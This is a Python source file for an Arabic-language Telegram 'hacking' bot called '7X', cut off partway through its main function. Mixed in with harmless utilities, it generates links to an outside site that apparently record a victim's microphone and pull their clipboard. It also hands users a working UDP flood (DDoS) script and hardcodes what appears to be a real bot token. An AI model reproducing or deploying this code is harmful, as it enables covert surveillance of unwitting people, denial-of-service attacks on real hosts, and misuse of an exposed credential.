import logging
import requests
from bs4 import BeautifulSoup
import random
import string
import re
import base64
import socket
import threading
import time
from datetime import datetime

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ConversationHandler
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)

logger = logging.getLogger(__name__)

# Replace with your bot token
TOKEN = "8729922349:AAGALtZjbmQAmZFx0wEynXK8osEDOAVsG1o"

# States for ConversationHandler
(
    CHOOSING_MAIN_MENU,
    GETTING_WEBSITE_URL,
    GETTING_IP_INFO_QUERY,
    GETTING_TELEGRAM_USER_ID,
    GETTING_ROBLOX_USERNAME,
    GETTING_DECORATE_TEXT,
    GETTING_DECRYPT_ROBLOX_SCRIPT,
    GETTING_CHECK_LINK_URL,
) = range(8)

# Main menu keyboard
main_menu_keyboard = [
    [InlineKeyboardButton("ملفات موقع 🌐", callback_data='website_files'), InlineKeyboardButton("معلومات IP 📍", callback_data='ip_info')],
    [InlineKeyboardButton("ايميل وهمي 📧", callback_data='temp_email'), InlineKeyboardButton("ادوات اختراق 🛠️", callback_data='hacking_tools')],
    [InlineKeyboardButton("بحث عن مستخدم 🔍", callback_data='search_user'), InlineKeyboardButton("سحب الحافظه 📋", callback_data='clipboard_pull')],
    [InlineKeyboardButton("صوت ضحيه 🎤", callback_data='victim_sound'), InlineKeyboardButton("كيف تصبح هاكر 👨‍💻", callback_data='how_to_be_hacker')],
    [InlineKeyboardButton("فك تشفير سكربتات روبلوكس base64 🔓", callback_data='decrypt_roblox'), InlineKeyboardButton("معلومات حساب روبلوكس 👤", callback_data='roblox_account_info')],
    [InlineKeyboardButton("زخرفه ✨", callback_data='decorate_text'), InlineKeyboardButton("نكته 😂", callback_data='joke')],
    [InlineKeyboardButton("اداة DDOS خفيفه تعليميه 💥", callback_data='ddos_tool'), InlineKeyboardButton("فحص الرابط 🔗", callback_data='check_link')],
    [InlineKeyboardButton("توليد كلمات مرور 🔑", callback_data='generate_password'), InlineKeyboardButton("تعليمات 📜", callback_data='instructions')],
]
main_menu_reply_markup = InlineKeyboardMarkup(main_menu_keyboard)

async def start(update: Update, context) -> int:
    user = update.effective_user
    await update.message.reply_html(
        f"مرحباً {user.mention_html()}!\n\nأهلاً بك في بوت 7X 😈!\nمعرف حسابك التليجرام هو: {user.id}",
        reply_markup=main_menu_reply_markup
    )
    return CHOOSING_MAIN_MENU

async def main_menu(update: Update, context) -> int:
    user = update.effective_user
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        f"مرحباً {user.mention_html()}!\n\nأهلاً بك في بوت 7X 😈!\nمعرف حسابك التليجرام هو: {user.id}",
        reply_markup=main_menu_reply_markup
    )
    return CHOOSING_MAIN_MENU

async def button(update: Update, context) -> int:
    query = update.callback_query
    await query.answer()

    if query.data == 'website_files':
        await query.edit_message_text("الرجاء إرسال رابط الموقع الذي تريد الحصول على ملف HTML الخاص به. 🌐", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_WEBSITE_URL

    elif query.data == 'ip_info':
        await query.edit_message_text("الرجاء إرسال عنوان IP أو اسم النطاق (Domain) للحصول على معلوماته. 📍", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_IP_INFO_QUERY

    elif query.data == 'temp_email':
        await generate_temp_email(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'hacking_tools':
        hacking_tools_text = """
• أدوات اختراق الشبكات والأنظمة:

1. Nmap
لفحص الشبكات واكتشاف الأجهزة والخدمات المفتوحة.

2. Wireshark
لتحليل حزم الشبكة ورصد البيانات المرسلة والمستقبلة.

3. Metasploit Framework
منصة لاختبار الثغرات وتنفيذ هجمات تحكم عن بُعد.

4. Aircrack-ng
لاختبار اختراق شبكات الواي فاي (Wi-Fi).

5. Burp Suite
أداة لاختبار أمان تطبيقات الويب واكتشاف ثغرات مثل XSS وSQL Injection.

6. John the Ripper
برنامج لكسر كلمات المرور (Password Cracking).

7. Hydra
أداة اختبار قوة كلمات المرور (Brute Force).

8. Nikto
ماسح ثغرات ويب (Web Vulnerability Scanner).

9. SQLmap
لاكتشاف واستغلال ثغرات SQL Injection في قواعد البيانات.

10. Hashcat
برنامج قوي لكسر كلمات المرور المشفرة.


---

أدوات نظام لينكس الشائعة في مجال الأمن:

Kali Linux
توزيعة لينكس مخصصة للاختراق الأخلاقي تحتوي على معظم الأدوات السابقة.

Parrot Security OS
توزيعة بديلة مع أدوات مشابهة
"""
        await query.edit_message_text(hacking_tools_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU

    elif query.data == 'search_user':
        await query.edit_message_text("الرجاء إرسال معرف حساب شخص في تليجرام للانتقال إلى حسابه. 🔍", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_TELEGRAM_USER_ID

    elif query.data == 'clipboard_pull':
        user_id = query.from_user.id
        clipboard_link = f"✅- تم إنشاء رابط سحب الحافظة \nhttps://max.powerv1.site/pag/cop.php?ID={user_id}&IDx={user_id}"
        await query.edit_message_text(clipboard_link, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU

    elif query.data == 'victim_sound':
        user_id = query.from_user.id
        victim_sound_link = f"✅- تم إنشاء رابط تسجيل صوت اضحيه\nhttps://max.powerv1.site/pag/mic.php?ID={user_id}&IDx={user_id}"
        await query.edit_message_text(victim_sound_link, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU

    elif query.data == 'how_to_be_hacker':
        how_to_hacker_text = """
• 1. ابدأ بتعلّم أساسيات الكمبيوتر: كيف يعمل الجهاز، الملفات، الرام، المعالج.

2. اتقن الشبكات: مثل IP, DNS, البروتوكولات (TCP/IP).

3. استخدم نظام Linux: هو النظام الأساسي للهاكرز المحترفين.

4. تعلم البرمجة: أهم لغات الاختراق: Python، Bash، C، JavaScript.

5. تعرّف على أنواع أنظمة التشغيل: Windows، Linux، Android.

6. استخدم أدوات اختبار الاختراق مثل:

Nmap (للبحث عن الأجهزة).

Wireshark (لمراقبة الشبكة).

Metasploit (لتجربة الثغرات).

7. افهم الثغرات الأمنية: SQL Injection، XSS، Brute Force.

8. مارس عبر منصات تدريب:

HackTheBox

TryHackMe

9. تعلّم الهندسة الاجتماعية: فن خداع الناس لجمع معلومات.

10. تدرّب على اختراق قانوني (CTF) لتطوير مهاراتك.

11. اقرأ كتب وأدلة تعليمية متخصصة.

12. تابع دورات على يوتيوب ومواقع مجانية.

13. احصل على شهادات دولية مثل CEH أو OSCP.

14. ابقَ مطّلعًا على أحدث الثغرات والهجمات.

15. كن أخلاقيًا ولا تخرق القانون.

16. سجّل في مجتمعات هاكرز أخلاقيين لتتعلّم منهم.

17. استخدم مهاراتك في حماية الأنظمة وليس تخريبها.

18. ابدأ صغيرًا، وتمرّن يوميًا، ولا تستعجل الاحتراف
"""
        await query.edit_message_text(how_to_hacker_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU

    elif query.data == 'decrypt_roblox':
        await query.edit_message_text("الرجاء إرسال ملف يحتوي على سكربت روبلوكس مشفر (base64 أو تشفير ضعيف) لفك تشفيره. 🔓", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_DECRYPT_ROBLOX_SCRIPT

    elif query.data == 'roblox_account_info':
        await query.edit_message_text("الرجاء إرسال اسم المستخدم (Username) الخاص بحساب روبلوكس للحصول على معلوماته. 👤", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_ROBLOX_USERNAME

    elif query.data == 'decorate_text':
        await query.edit_message_text("الرجاء إرسال النص الذي تريد زخرفته. ✨", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_DECORATE_TEXT

    elif query.data == 'joke':
        await generate_joke(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'ddos_tool':
        ddos_code = """
import socket
import threading
import random
import time
import sys

target_ip = input("IP: ")
target_port = int(input("Port: "))
threads = int(input("Threads: "))

def flood():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(random._urandom(1024), (target_ip, target_port))
        except:
            pass

for _ in range(threads):
    threading.Thread(target=flood).start()
"""
        await query.edit_message_text(f"```python\n{ddos_code}\n```", parse_mode='MarkdownV2', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU

    elif query.data == 'check_link':
        await query.edit_message_text("الرجاء إرسال الرابط الذي تريد فحصه. 🔗", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_CHECK_LINK_URL

    elif query.data == 'generate_password':
        await generate_strong_password(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'instructions':
        instructions_text = """
📜 شروط الاستخدام:

أتعهد أنا المستخدم للتطبيق بأنني:

✅ لن أستخدم التطبيق فيما يغضب الله تعالى.
✅ لن أسرق صور أو حسابات بغرض السرقة أو التجسس على الرسائل.
✅ سأستخدم التطبيق فقط لغرض:

المزاح اللطيف.

الربح المشروع.

التجربة الشخصية.

الدعاية والإعلانات المسموح بها.

⚠️ أُبرئ ذمة مالك ومسؤول التطبيق من أي استخدام خاطئ أو مخالف يؤدي إلى معصية أو ضرر بالآخرين.

✨ الرجاء استخدام التطبيق بما يرضي الله ويحفظ حقوق الجميع
"""
        await query.edit_message_text(instructions_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU

    return CHOOSING_MAIN_MENU

async def get_website_html(update: Update, context) -> int:
    url = update.message.text
    if not url or not (url.startswith('http://') or url.startswith('https://')):
        await update.message.reply_text("الرجاء إرسال رابط صحيح يبدأ بـ http:// أو https:// 🌐", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_WEBSITE_URL

    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        file_name = f"website_{re.sub(r'[\W_]+', '_', url)}.html"
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(str(soup.prettify()))
        await update.message.reply_document(document=open(file_name, 'rb'), filename=file_name, caption="تم استخراج ملف HTML للموقع بنجاح. 📄", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"حدث خطأ أثناء جلب محتوى الموقع: {e} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def get_ip_info(update: Update, context) -> int:
    query_text = update.message.text
    if not query_text:
        await update.message.reply_text("الرجاء إرسال عنوان IP أو اسم النطاق (Domain) للحصول على معلوماته. 📍", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_IP_INFO_QUERY

    try:
        ip_address = None
        domain_name = None

        if re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", query_text):
            ip_address = query_text
            domain_name = "غير متوفر"
        else:
            try:
                ip_address = socket.gethostbyname(query_text)
                domain_name = query_text
            except socket.gaierror:
                await update.message.reply_text("تعذر حل اسم النطاق أو عنوان IP غير صالح. ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
                return CHOOSING_MAIN_MENU

        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        response.raise_for_status()
        data = response.json()

        if data.get("status") == "success":
            info_text = f"🌐 الدومين: {domain_name}\n"
            info_text += f"📟 عنوان IP: {data.get('query', 'غير متوفر')}\n"
            info_text += f"🏳️ الدولة: {data.get('country', 'غير متوفر')}\n"
            info_text += f"🏙️ المدينة: {data.get('city', 'غير متوفر')}\n"
            info_text += f"🌍 القارة: {data.get('continent', 'غير متوفر')}\n"
            info_text += f"🛰️ مزود الخدمة (ISP): {data.get('isp', 'غير متوفر')}\n"
            info_text += f"🖥️ المنظمة (Organization): {data.get('org', 'غير متوفر')}\n"
            info_text += f"💼 ASN: {data.get('as', 'غير متوفر')}\n"
            info_text += f"🧭 الإحداثيات: {data.get('lat', 'غير متوفر')}, {data.get('lon', 'غير متوفر')}\n"
            if data.get('lat') and data.get('lon'):
                info_text += f"📌 رابط لعرض الموقع على الخريطة: https://www.google.com/maps?q={data['lat']},{data['lon']}\n"
            else:
                info_text += f"📌 رابط لعرض الموقع على الخريطة: غير متوفر\n"

            if data.get('proxy') or data.get('hosting'):
                info_text += "\n⚠️ ملاحظة: قد يكون الموقع الجغرافي المعروض هو موقع خادم CDN/Proxy وليس بالضرورة موقع الخادم الأصلي."

            await update.message.reply_text(info_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        else:
            await update.message.reply_text(f"تعذر الحصول على معلومات IP: {data.get('message', 'خطأ غير معروف')} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"حدث خطأ أثناء الاتصال بخدمة معلومات IP: {e} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def generate_temp_email(update: Update, context) -> None:
    try:
        domains_response = requests.get("https://api.mail.tm/domains")
        domains_response.raise_for_status()
        domains = domains_response.json()

        if not domains:
            await update.callback_query.edit_message_text("عذراً، لا توجد نطاقات بريد مؤقتة متاحة حالياً. 📧❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
            return

        domain = random.choice(domains)['domain']
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        password = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=12))
        email_address = f"{username}@{domain}"

        create_account_response = requests.post("https://api.mail.tm/accounts", json={
            "address": email_address,
            "password": password
        })
        create_account_response.raise_for_status()

        email_info = f"✅ تم إنشاء بريد إلكتروني مؤقت جديد:\n\n📧 البريد الإلكتروني: `{email_address}`\n🔑 كلمة المرور: `{password}`\n\nيمكنك استخدام هذا البريد لاستقبال الرسائل. تذكر أن هذا البريد مؤقت وسيتم حذفه بعد فترة. ⏳"
        await update.callback_query.edit_message_text(email_info, parse_mode='MarkdownV2', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))

    except requests.exceptions.RequestException as e:
        await update.callback_query.edit_message_text(f"حدث خطأ أثناء توليد البريد المؤقت: {e} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.callback_query.edit_message_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))

async def search_telegram_user(update: Update, context) -> int:
    user_id_or_username = update.message.text
    if not user_id_or_username:
        await update.message.reply_text("الرجاء إرسال معرف حساب شخص في تليجرام أو اسم المستخدم. 🔍", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_TELEGRAM_USER_ID

    try:
        if user_id_or_username.isdigit():
            user_link = f"tg://user?id={user_id_or_username}"
            await update.message.reply_text(f"يمكنك الانتقال إلى حساب المستخدم عبر هذا الرابط: [الذهاب للحساب]({user_link}) 🚀", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        elif user_id_or_username.startswith('@'):
            user_link = f"https://t.me/{user_id_or_username[1:]}"
            await update.message.reply_text(f"يمكنك الانتقال إلى حساب المستخدم عبر هذا الرابط: [الذهاب للحساب]({user_link}) 🚀", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        else:
            await update.message.reply_text("الرجاء إدخال معرف حساب تليجرام صحيح (رقم) أو اسم مستخدم يبدأ بـ @. ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def generate_joke(update: Update, context) -> None:
    jokes = [
        "ما هو الشيء الذي يمشي ويقف وليس له أرجل؟ الساعة. 😂",
        "لماذا يضع الفيل طلاء أظافر أحمر؟ ليختبئ في شجرة الفراولة. 🐘💅",
        "ما هو أذكى حيوان؟ الزرافة، لأن رأسها في السحاب. 🦒🧠",
        "ماذا قال الجبل للجبل؟ لم نلتقِ منذ زمن طويل. ⛰️⛰️",
        "لماذا سميت حاسة الشم بهذا الاسم؟ لأنها تشم. 👃",
        "ما هو وجه الشبه بين الكمبيوتر والحفرة؟ كلاهما يحتاج إلى حفر. 💻🕳️",
        "ما هو الشيء الذي كلما أخذت منه كبر؟ الحفرة. 🕳️",
        "ما هو الشيء الذي يرتفع ولا ينزل؟ العمر. 📈",
        "ما هو الشيء الذي له عين واحدة ولا يرى؟ الإبرة. 👁️🧵",
        "ما هو الشيء الذي له أسنان ولا يعض؟ المشط. 🦷"
    ]
    joke = random.choice(jokes)
    await update.callback_query.edit_message_text(f"{joke}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("نكته أخرى 😂", callback_data='joke')], [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))

async def generate_strong_password(update: Update, context) -> None:
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for i in range(16))
    await update.callback_query.edit_message_text(f"🔑 كلمة مرور قوية جديدة:\n{password}", parse_mode='MarkdownV2', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("توليد كلمة مرور أخرى 🔑", callback_data='generate_password')], [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))

async def check_link(update: Update, context) -> int:
    url = update.message.text
    if not url or not (url.startswith('http://') or url.startswith('https://')):
        await update.message.reply_text("الرجاء إرسال رابط صحيح يبدأ بـ http:// أو https:// 🔗", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_CHECK_LINK_URL

    try:
        domain = re.findall(r'https?://(?:www\.)?([^/]+)\b', url)[0]

        ip_address = None
        try:
            ip_address = socket.gethostbyname(domain)
        except socket.gaierror:
            await update.message.reply_text("تعذر حل اسم النطاق من الرابط. ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
            return CHOOSING_MAIN_MENU

        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        response.raise_for_status()
        data = response.json()

        if data.get("status") == "success":
            info_text = f"🌐 الدومين: {domain}\n"
            info_text += f"📟 عنوان IP: {data.get('query', 'غير متوفر')}\n"
            info_text += f"🏳️ الدولة: {data.get('country', 'غير متوفر')}\n"
            info_text += f"🏙️ المدينة: {data.get('city', 'غير متوفر')}\n"
            info_text += f"🌍 القارة: {data.get('continent', 'غير متوفر')}\n"
            info_text += f"🛰️ مزود الخدمة (ISP): {data.get('isp', 'غير متوفر')}\n"
            info_text += f"🖥️ المنظمة (Organization): {data.get('org', 'غير متوفر')}\n"
            info_text += f"💼 ASN: {data.get('as', 'غير متوفر')}\n"
            info_text += f"🧭 الإحداثيات: {data.get('lat', 'غير متوفر')}, {data.get('lon', 'غير متوفر')}\n"
            if data.get('lat') and data.get('lon'):
                info_text += f"📌 رابط لعرض الموقع على الخريطة: https://www.google.com/maps?q={data['lat']},{data['lon']}\n"
            else:
                info_text += f"📌 رابط لعرض الموقع على الخريطة: غير متوفر\n"

            if data.get('proxy') or data.get('hosting'):
                info_text += "\n⚠️ ملاحظة: قد يكون الموقع الجغرافي المعروض هو موقع خادم CDN/Proxy وليس بالضرورة موقع الخادم الأصلي."

            await update.message.reply_text(info_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        else:
            await update.message.reply_text(f"تعذر الحصول على معلومات IP للرابط: {data.get('message', 'خطأ غير معروف')} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"حدث خطأ أثناء فحص الرابط: {e} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def get_roblox_account_info(update: Update, context) -> int:
    username = update.message.text
    if not username:
        await update.message.reply_text("الرجاء إرسال اسم المستخدم (Username) الخاص بحساب روبلوكس. 👤", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_ROBLOX_USERNAME

    try:
        user_id_response = requests.post(
            "https://users.roblox.com/v1/usernames/users",
            json={"usernames": [username], "excludeBannedUsers": True}
        )
        user_id_response.raise_for_status()
        user_data = user_id_response.json()

        if not user_data or not user_data.get('data'):
            await update.message.reply_text("لم يتم العثور على المستخدم بهذا الاسم. ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
            return CHOOSING_MAIN_MENU

        user_id = user_data['data'][0]['id']
        display_name = user_data['data'][0]['displayName']

        user_details_response = requests.get(f"https://users.roblox.com/v1/users/{user_id}")
        user_details_response.raise_for_status()
        details = user_details_response.json()

        friends_count_response = requests.get(f"https://friends.roblox.com/v1/users/{user_id}/friends/count")
        friends_count_response.raise_for_status()
        friends_count = friends_count_response.json().get('count', 'غير متوفر')

        followers_count_response = requests.get(f"https://friends.roblox.com/v1/users/{user_id}/followers/count")
        followers_count_response.raise_for_status()
        followers_count = followers_count_response.json().get('count', 'غير متوفر')

        created_date_str = details.get('created', 'غير متوفر')
        account_age = "غير متوفر"
        if created_date_str != 'غير متوفر':
            created_date = datetime.fromisoformat(created_date_str.replace('Z', '+00:00'))
            age_delta = datetime.now(created_date.tzinfo) - created_date
            years = age_delta.days // 365
            months = (age_delta.days % 365) // 30
            account_age = f"{years} سنة و {months} شهر"

        info_text = f"معلومات حساب روبلوكس:\n\n"
        info_text += f"👤 اسم المستخدم: {username}\n"
        info_text += f"🆔 معرف الحساب: {user_id}\n"
        info_text += f"✨ الاسم المعروض: {display_name}\n"
        info_text += f"🗓️ تاريخ الإنشاء: {created_date_str.split('T')[0] if created_date_str != 'غير متوفر' else 'غير متوفر'}\n"
        info_text += f"👴 عمر الحساب: {account_age}\n"
        info_text += f"👫 عدد الأصدقاء: {friends_count}\n"
        info_text += f"💖 عدد المتابعين: {followers_count}\n"

        await update.message.reply_text(info_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))

    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"حدث خطأ أثناء جلب معلومات حساب روبلوكس: {e} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def decorate_text(update: Update, context) -> int:
    text_to_decorate = update.message.text
    if not text_to_decorate:
        await update.message.reply_text("الرجاء إرسال النص الذي تريد زخرفته. ✨", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_DECORATE_TEXT

    decorated_options = [
        f"«{text_to_decorate}»", f"『{text_to_decorate}』", f"【{text_to_decorate}】",
        f"⦅{text_to_decorate}⦆", f"〘{text_to_decorate}〙", f"〚{text_to_decorate}〛",
        f"❨{text_to_decorate}❩", f"❪{text_to_decorate}❫", f"❬{text_to_decorate}❭",
        f"❰{text_to_decorate}❱", f"❲{text_to_decorate}❳", f"❴{text_to_decorate}❵",
        f"⟅{text_to_decorate}⟆", f"⟪{text_to_decorate}⟫", f"⟬{text_to_decorate}⟭",
        f"⟮{text_to_decorate}⟯", f"⦃{text_to_decorate}⦄", f"⦅{text_to_decorate}⦆",
        f"⦗{text_to_decorate}⦘", f"⦘{text_to_decorate}⦗", f"⦙{text_to_decorate}⦙",
        f"⦚{text_to_decorate}⦚", f"⦛{text_to_decorate}⦜", f"⦝{text_to_decorate}⦞",
        f"⦟{text_to_decorate}⦠", f"⦡{text_to_decorate}⦢", f"⦣{text_to_decorate}⦤",
        f"⦥{text_to_decorate}⦦", f"⦧{text_to_decorate}⦨", f"⦩{text_to_decorate}⦪"
    ]

    response_text = "اختر الزخرفة المفضلة لديك:\n\n"
    for i, option in enumerate(decorated_options):
        response_text += f"{i+1}. {option}\n"

    await update.message.reply_text(response_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def decrypt_roblox_script(update: Update, context) -> int:
    if update.message.document:
        file_id = update.message.document.file_id
        new_file = await context.bot.get_file(file_id)
        file_path = f"./{update.message.document.file_name}"
        await new_file.download_to_drive(file_path)

        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                encrypted_content = f.read()

            try:
                decoded_content = base64.b64decode(encrypted_content).decode('utf-8')
                decrypted_text = "--تم فك بواسطه بوت 7X 😈\n" + decoded_content
            except Exception:
                decrypted_text = "--تم فك بواسطه بوت 7X 😈\n" + "لم يتم التعرف على التشفير أو فكه. قد يكون التشفير أقوى من المتوقع أو غير مدعوم حالياً.\n" + encrypted_content

            output_file_name = f"decrypted_{update.message.document.file_name}"
            with open(output_file_name, "w", encoding="utf-8") as f:
                f.write(decrypted_text)

            await update.message.reply_document(document=open(output_file_name, 'rb'), filename=output_file_name, caption="تم فك تشفير السكربت بنجاح (إذا كان التشفير مدعوماً). 🔓", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))

        except Exception as e:
            await update.message.reply_text(f"حدث خطأ أثناء معالجة الملف: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    else:
        await update.message.reply_text("الرجاء إرسال ملف السكربت المشفر. 📄", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def cancel(update: Update, context) -> int:
    await update.message.reply_text(
        "تم إلغاء العملية. يمكنك البدء من جديد باستخدام /start.", reply_markup=main_menu_reply_markup
    )
    return ConversationHandler.END

def main() -> None:
    application = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSING_MAIN_MENU: [
                CallbackQueryHandler(button, pattern='^(?!main_menu$).*'),
                CallbackQueryHandler(main_menu, pattern='^main_menu$')
            ],
            GETTING_WEBSITE_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_website_html)],
